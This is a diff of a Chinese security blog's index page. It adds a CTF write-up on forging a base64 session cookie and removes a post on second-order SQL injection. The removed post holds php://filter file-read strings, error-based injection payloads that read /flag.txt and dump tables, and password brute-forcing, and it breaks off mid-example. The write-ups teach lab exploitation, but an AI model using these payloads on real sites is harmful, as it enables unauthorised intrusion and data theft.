@@ -169,6 +169,69 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-简单的cookie伪造" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/10/03/%E7%AE%80%E5%8D%95%E7%9A%84cookie%E4%BC%AA%E9%80%A0/" class="article-date">
+  	<time datetime="2021-10-02T16:00:00.000Z" itemprop="datePublished">2021-10-03</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/10/03/%E7%AE%80%E5%8D%95%E7%9A%84cookie%E4%BC%AA%E9%80%A0/">
+        简单的cookie伪造
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="简单的cookie伪造"><a href="#简单的cookie伪造" class="headerlink" title="简单的cookie伪造"></a>简单的cookie伪造</h1><p>打开页面发现，是一个购买的界面，可以看见第三个是购买flag的，打开页面源码，发现没有什么提示，所以我们点击购买，然后抓包</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /buy HTTP/1.1</span><br><span class="line">Host: 8075a6af-0656-420b-8689-587fea458b64.node4.buuoj.cn:81</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:92.0) Gecko/20100101 Firefox/92.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Content-Length: 4</span><br><span class="line">Origin: http://8075a6af-0656-420b-8689-587fea458b64.node4.buuoj.cn:81</span><br><span class="line">Connection: close</span><br><span class="line">Referer: http://8075a6af-0656-420b-8689-587fea458b64.node4.buuoj.cn:81/</span><br><span class="line">Cookie: UM_distinctid=17c472616a335b-0660cc5b8058a1-4c3e2778-186a00-17c472616a43f; session=eyJtb25leSI6IDM3LCAiaGlzdG9yeSI6IFsiWXVtbXkgY2hvY29sYXRlIGNoaXAgY29va2llIiwgIll1bW15IHBlcHBhcmtha2EiLCAiWXVtbXkgY2hvY29sYXRlIGNoaXAgY29va2llIiwgIll1bW15IGNob2NvbGF0ZSBjaGlwIGNvb2tpZSJdfQ==</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line"></span><br><span class="line">id=2</span><br></pre></td></tr></table></figure>
+<p>发现有一个session字段，且值是base64加密的，所以base64解密后</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;money&quot;: 37, &quot;history&quot;: [&quot;Yummy chocolate chip cookie&quot;, &quot;Yummy pepparkaka&quot;, &quot;Yummy chocolate chip cookie&quot;, &quot;Yummy chocolate chip cookie&quot;]&#125;</span><br></pre></td></tr></table></figure>
+<p>因此，我们可以修改37为500，然后伪造cookie中的session字段并提交，得到回馈的seesion字段，我们再base64解密一下即可得flag</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;money&quot;: 400, &quot;history&quot;: [&quot;Yummy chocolate chip cookie&quot;, &quot;Yummy pepparkaka&quot;, &quot;Yummy chocolate chip cookie&quot;, &quot;Yummy chocolate chip cookie&quot;, &quot;flag&#123;d1ca8b7e-27c5-415b-a858-0c9d22826c21&#125;\n&quot;]&#125;</span><br></pre></td></tr></table></figure>
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ssrf/" rel="tag">ssrf</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-正则绕过" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -1057,193 +1120,6 @@ echo urlencode(serialize($b));
       
 	<div class="article-tag tagcloud">
 		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
-    <article id="post-二次注入" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/09/23/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/" class="article-date">
-  	<time datetime="2021-09-22T16:00:00.000Z" itemprop="datePublished">2021-09-23</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/09/23/%E4%BA%8C%E6%AC%A1%E6%B3%A8%E5%85%A5/">
-        二次注入
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="二次注入"><a href="#二次注入" class="headerlink" title="二次注入"></a>二次注入</h1><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>二次注入是攻击者构造恶意数据，并且将这个数据存储在数据库里，虽然在用户输入恶意数据时会对其中的特殊字符进行了转义处理，但是当恶意数据插入到数据库时被处理的数据又会被还原并存储到数据库中，当web程序调用在数据库中的恶意数据时，将不会再进行转义，此时会执行sql查询，这就造成了sql二次注入</p>
-<h2 id="二次注入的步骤"><a href="#二次注入的步骤" class="headerlink" title="二次注入的步骤"></a>二次注入的步骤</h2><ol>
-<li><p>插入恶意数据</p>
-</li>
-<li><p>引用恶意数据</p>
-</li>
-</ol>
-<h2 id="实例-CISCN2019-华北赛区-Day1-Web5-CyberPunk"><a href="#实例-CISCN2019-华北赛区-Day1-Web5-CyberPunk" class="headerlink" title="实例(CISCN2019 华北赛区 Day1 Web5 CyberPunk)"></a>实例(CISCN2019 华北赛区 Day1 Web5 CyberPunk)</h2><p>打开页面源码，发现一个可疑信息</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--?file=?--&gt;</span><br></pre></td></tr></table></figure>
-<p>因此，怀疑有文件包含漏洞，所以我们可以利用php协议来读取index.php文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?file=php://filter/convert.base64-encode/resource=index.php</span><br></pre></td></tr></table></figure>
-<p>然后我们观察页面源码，发现还可以读取confirm.php、search.php、change.php、delete.php和config.php文件</p>
-<p>confirm.php</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">require_once &quot;config.php&quot;;</span><br><span class="line">//var_dump($_POST);</span><br><span class="line"></span><br><span class="line">if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = &#x27;&#x27;;</span><br><span class="line">    $pattern = &#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;;</span><br><span class="line">    $user_name = $_POST[&quot;user_name&quot;];</span><br><span class="line">    $address = $_POST[&quot;address&quot;];</span><br><span class="line">    $phone = $_POST[&quot;phone&quot;];</span><br><span class="line">    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg = &#x27;no sql inject!&#x27;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $sql = &quot;select * from `user` where `user_name`=&#x27;&#123;$user_name&#125;&#x27; and `phone`=&#x27;&#123;$phone&#125;&#x27;&quot;;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if($fetch-&gt;num_rows&gt;0) &#123;</span><br><span class="line">        $msg = $user_name.&quot;已提交订单&quot;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $sql = &quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;;</span><br><span class="line">        $re = $db-&gt;prepare($sql);</span><br><span class="line">        $re-&gt;bind_param(&quot;sss&quot;, $user_name, $address, $phone);</span><br><span class="line">        $re = $re-&gt;execute();</span><br><span class="line">        if(!$re) &#123;</span><br><span class="line">            echo &#x27;error&#x27;;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            exit;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = &quot;订单提交成功&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125; else &#123;</span><br><span class="line">    $msg = &quot;信息不全&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>search.php</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">require_once &quot;config.php&quot;; </span><br><span class="line"></span><br><span class="line">if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = &#x27;&#x27;;</span><br><span class="line">    $pattern = &#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;;</span><br><span class="line">    $user_name = $_POST[&quot;user_name&quot;];</span><br><span class="line">    $phone = $_POST[&quot;phone&quot;];</span><br><span class="line">    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; </span><br><span class="line">        $msg = &#x27;no sql inject!&#x27;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $sql = &quot;select * from `user` where `user_name`=&#x27;&#123;$user_name&#125;&#x27; and `phone`=&#x27;&#123;$phone&#125;&#x27;&quot;;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        if(!$row) &#123;</span><br><span class="line">            echo &#x27;error&#x27;;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            exit;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = &quot;&lt;p&gt;姓名:&quot;.$row[&#x27;user_name&#x27;].&quot;&lt;/p&gt;&lt;p&gt;, 电话:&quot;.$row[&#x27;phone&#x27;].&quot;&lt;/p&gt;&lt;p&gt;, 地址:&quot;.$row[&#x27;address&#x27;].&quot;&lt;/p&gt;&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = &quot;未找到订单!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else &#123;</span><br><span class="line">    $msg = &quot;信息不全&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>delete.php</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">require_once &quot;config.php&quot;;</span><br><span class="line"></span><br><span class="line">if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = &#x27;&#x27;;</span><br><span class="line">    $pattern = &#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;;</span><br><span class="line">    $user_name = $_POST[&quot;user_name&quot;];</span><br><span class="line">    $phone = $_POST[&quot;phone&quot;];</span><br><span class="line">    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123; </span><br><span class="line">        $msg = &#x27;no sql inject!&#x27;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $sql = &quot;select * from `user` where `user_name`=&#x27;&#123;$user_name&#125;&#x27; and `phone`=&#x27;&#123;$phone&#125;&#x27;&quot;;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        $result = $db-&gt;query(&#x27;delete from `user` where `user_id`=&#x27; . $row[&quot;user_id&quot;]);</span><br><span class="line">        if(!$result) &#123;</span><br><span class="line">            echo &#x27;error&#x27;;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            exit;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = &quot;订单删除成功&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = &quot;未找到订单!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else &#123;</span><br><span class="line">    $msg = &quot;信息不全&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>change.php</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">require_once &quot;config.php&quot;;</span><br><span class="line"></span><br><span class="line">if(!empty($_POST[&quot;user_name&quot;]) &amp;&amp; !empty($_POST[&quot;address&quot;]) &amp;&amp; !empty($_POST[&quot;phone&quot;]))</span><br><span class="line">&#123;</span><br><span class="line">    $msg = &#x27;&#x27;;</span><br><span class="line">    $pattern = &#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;;</span><br><span class="line">    $user_name = $_POST[&quot;user_name&quot;];</span><br><span class="line">    $address = addslashes($_POST[&quot;address&quot;]);</span><br><span class="line">    $phone = $_POST[&quot;phone&quot;];</span><br><span class="line">    if (preg_match($pattern,$user_name) || preg_match($pattern,$phone))&#123;</span><br><span class="line">        $msg = &#x27;no sql inject!&#x27;;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        $sql = &quot;select * from `user` where `user_name`=&#x27;&#123;$user_name&#125;&#x27; and `phone`=&#x27;&#123;$phone&#125;&#x27;&quot;;</span><br><span class="line">        $fetch = $db-&gt;query($sql);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    if (isset($fetch) &amp;&amp; $fetch-&gt;num_rows&gt;0)&#123;</span><br><span class="line">        $row = $fetch-&gt;fetch_assoc();</span><br><span class="line">        $sql = &quot;update `user` set `address`=&#x27;&quot;.$address.&quot;&#x27;, `old_address`=&#x27;&quot;.$row[&#x27;address&#x27;].&quot;&#x27; where `user_id`=&quot;.$row[&#x27;user_id&#x27;];</span><br><span class="line">        $result = $db-&gt;query($sql);</span><br><span class="line">        if(!$result) &#123;</span><br><span class="line">            echo &#x27;error&#x27;;</span><br><span class="line">            print_r($db-&gt;error);</span><br><span class="line">            exit;</span><br><span class="line">        &#125;</span><br><span class="line">        $msg = &quot;订单修改成功&quot;;</span><br><span class="line">    &#125; else &#123;</span><br><span class="line">        $msg = &quot;未找到订单!&quot;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;else &#123;</span><br><span class="line">    $msg = &quot;信息不全&quot;;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>config.php</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">ini_set(&quot;open_basedir&quot;, getcwd() . &quot;:/etc:/tmp&quot;);</span><br><span class="line"></span><br><span class="line">$DATABASE = array(</span><br><span class="line"></span><br><span class="line">    &quot;host&quot; =&gt; &quot;127.0.0.1&quot;,</span><br><span class="line">    &quot;username&quot; =&gt; &quot;root&quot;,</span><br><span class="line">    &quot;password&quot; =&gt; &quot;root&quot;,</span><br><span class="line">    &quot;dbname&quot; =&gt;&quot;ctfusers&quot;</span><br><span class="line">);</span><br><span class="line"></span><br><span class="line">$db = new mysqli($DATABASE[&#x27;host&#x27;],$DATABASE[&#x27;username&#x27;],$DATABASE[&#x27;password&#x27;],$DATABASE[&#x27;dbname&#x27;]);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
-<p>从这些文件中我们可以知道它提交的sql语句</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * from `user` where `user_name`=&#x27;&#123;$user_name&#125;&#x27; and `phone`=&#x27;&#123;$phone&#125;&#x27;</span><br></pre></td></tr></table></figure>
-
-<p>但是每个文件都对$user_name和$phone进行了严格的过滤</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$pattern = &#x27;/select|insert|update|delete|and|or|join|like|regexp|where|union|into|load_file|outfile/i&#x27;;</span><br></pre></td></tr></table></figure>
-
-<p>但是在confirm.php文件中有address这个参数，且会将address参数的值会插入到数据库中</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;insert into `user` ( `user_name`, `address`, `phone`) values( ?, ?, ?)&quot;;</span><br></pre></td></tr></table></figure>
-
-<p>然后change.php文件中有一串代码会读取刚刚存入数据库中的address参数的信息，其中addslashes()函数会将双引号加上反斜杠进行转义，所以影响不大</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql = &quot;update `user` set `address`=&#x27;&quot;.$address.&quot;&#x27;, `old_address`=&#x27;&quot;.$row[&#x27;address&#x27;].&quot;&#x27; where `user_id`=&quot;.$row[&#x27;user_id&#x27;];</span><br></pre></td></tr></table></figure>
-
-<p>所以我们可以在提交订单界面注入恶意数据后，在修改订单界面读取address时触发恶意数据进行读取，在这里我们利用报错注入来读取数据库中想要的信息</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#x27;/flag.txt&#x27;),1,30)),0x7e),1)#</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>读取前30个字符串</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&#x27; where user_id=updatexml(1,concat(0x7e,(select substr(load_file(&#x27;/flag.txt&#x27;),30,60)),0x7e),1)#</span><br></pre></td></tr></table></figure>
-
-<p>读取后30个字符串</p>
-<h2 id="实例2-RCTF2015-EasySQL"><a href="#实例2-RCTF2015-EasySQL" class="headerlink" title="实例2([RCTF2015]EasySQL)"></a>实例2([RCTF2015]EasySQL)</h2><p>打开页面，发现有两个功能，是登录和注册两个功能，所以我们尝试在这两个地方进行sql注入的闭合测试，发现没sql注入，然后注册一个账号，并登录，然后再搜集信息，发现有一个修改密码的界面，进去后对它进行sql注入的闭合测试，发现出现sql注入，且闭合符号是双引号，而这里测试sql注入的方式是先在注册界面构造</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&quot;</span><br></pre></td></tr></table></figure>
-<p>然后在修改密码界面，再输入</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&quot;</span><br></pre></td></tr></table></figure>
-<p>看是否存在注入，测试后，发现确实存在sql注入，且闭合符号是双引号，而且此时，我们可以使用二次注入，所以构造</p>
-<p>爆数据库</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;||extractvalue(1,concat(0x7e,(select(database()))))%23</span><br></pre></td></tr></table></figure>
-<p>爆数据表</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;||extractvalue(1,concat(0x7e,(select(group_concat(table_name))from(information_schema.tables)where(table_schema=database()))))%23</span><br></pre></td></tr></table></figure>
-<p>爆数据字段</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;||extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;flag&#x27;))))%23</span><br></pre></td></tr></table></figure>
-<p>发现爆内容的时候，发现这个flag是假的，所以爆user表的字段</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;||extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;user&#x27;))))%23</span><br></pre></td></tr></table></figure>
-<p>发现不可以爆出完整的数据，所以我们可以使用正则匹配来爆出我们需要的字段，使用regexp(‘^r’)就是匹配开头为r的字符串，所以我们可疑构造</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&quot;||extractvalue(1,concat(0x7e,(select(group_concat(column_name))from(information_schema.columns)where(table_name=&#x27;users&#x27;)&amp;&amp;(column_name)regexp(&#x27;^r&#x27;))))#</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>来爆出我们所需字段，然后爆real_flag_1s_here字段的内容</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1&quot;||extractvalue(1,concat(0x7e,(select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;^f&#x27;))))#</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<p>但是发现只出现一部分，所以我们可以使用reverse()函数来倒转输出</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot;||extractvalue(1,concat(0x7e,reverse((select(group_concat(real_flag_1s_here))from(users)where(real_flag_1s_here)regexp(&#x27;^f&#x27;)))))#</span><br></pre></td></tr></table></figure>
-<p>最后拼接即可</p>
-<p>参考文章：[<a target="_blank" rel="noopener" href="https://blog.csdn.net/SopRomeo/article/details/107324563]">https://blog.csdn.net/SopRomeo/article/details/107324563]</a></p>
-<pre><code> [https://blog.csdn.net/qq_36761831/article/details/82862135]
-</code></pre>
-<h2 id="实例3-网鼎杯-2018-Comment"><a href="#实例3-网鼎杯-2018-Comment" class="headerlink" title="实例3([网鼎杯 2018]Comment)"></a>实例3([网鼎杯 2018]Comment)</h2><p>打开页面，发现是一个留言板，然后发现要发帖的话，需要先登录，而它有提示是</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">zhangwei***</span><br></pre></td></tr></table></figure>
-<p>后面是三位数字，所以可以使用爆破的方法，爆出密码为zhangwei666，然后就没有发现什么有价值的信息，所以使用GitHack.py进行扫描，发现有.git文件泄露</p>
-<p>write_do.php</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &quot;mysql.php&quot;;</span><br><span class="line">session_start();</span><br><span class="line">if($_SESSION[&#x27;login&#x27;] != &#x27;yes&#x27;)&#123;</span><br><span class="line">    header(&quot;Location: ./login.php&quot;);</span><br><span class="line">    die();</span><br><span class="line">&#125;</span><br><span class="line">if(isset($_GET[&#x27;do&#x27;]))&#123;</span><br><span class="line">switch ($_GET[&#x27;do&#x27;])</span><br><span class="line">&#123;</span><br><span class="line">case &#x27;write&#x27;:</span><br><span class="line">    break;</span><br><span class="line">case &#x27;comment&#x27;:</span><br><span class="line">    break;</span><br><span class="line">default:</span><br><span class="line">    header(&quot;Location: ./index.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">    header(&quot;Location: ./index.php&quot;);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p>但是发现代码补全，然后查看控制台，发现</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">程序员GIT写一半跑路了,都没来得及Commit :)</span><br></pre></td></tr></table></figure>
-<p>这一个重要的信息，所以我们需要找到commit的值来恢复php文件，所以使用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git log --all</span><br></pre></td></tr></table></figure>
-<p>来查看历史记录并找到commit的值，即寻找有write_do.php字段的commit，然后使用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git reset --hard commit的值</span><br></pre></td></tr></table></figure>
-<p>来恢复文件</p>
-<p>write_do.php</p>
